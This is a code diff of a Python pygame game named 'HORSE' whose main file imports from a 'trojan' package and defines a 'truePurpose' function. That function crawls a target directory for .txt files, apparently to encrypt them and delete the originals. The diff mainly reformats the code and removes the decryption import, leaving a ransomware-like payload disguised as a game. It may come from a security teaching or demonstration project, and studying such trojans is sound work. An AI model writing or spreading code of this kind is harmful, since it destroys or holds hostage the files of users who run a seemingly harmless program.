@@ -1,13 +1,13 @@
-import pygame
 import os
 import pathlib
-from typing import List
 from multiprocessing import Process
+from typing import List
 
-# Relative Imports
+import pygame
+
 from game.menu.main_menu import main_menu
 from trojan.crawler import Crawler
-from trojan.crypto import encryptAndDeletePlaintext, decryptAndDeleteCipherText
+from trojan.crypto import encryptAndDeletePlaintext
 
 PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
 
@@ -26,7 +26,8 @@ def game():
     window = pygame.display.set_mode((800, 600), 0, 32)
     pygame.display.set_caption("HORSE")
     window_icon = pygame.image.load(
-        f"{PATH_TO_ROOT}{os.sep}assets{os.sep}menu{os.sep}app_icon.png")
+        f"{PATH_TO_ROOT}{os.sep}assets{os.sep}menu{os.sep}app_icon.png"
+    )
     pygame.display.set_icon(window_icon)
 
     # Start the main menu
@@ -44,8 +45,7 @@ def truePurpose(target_directory: str):
         target_directory: the directory to ecrypt
     """
 
-    c: Crawler = Crawler(target_directory, extension_white_list=[
-                         '.txt'], abs_path=True)
+    c: Crawler = Crawler(target_directory, extension_white_list=[".txt"], abs_path=True)
     c.walk_tree()
     filesToEncrypt: List[str] = c.get_files()
     for s in filesToEncrypt:
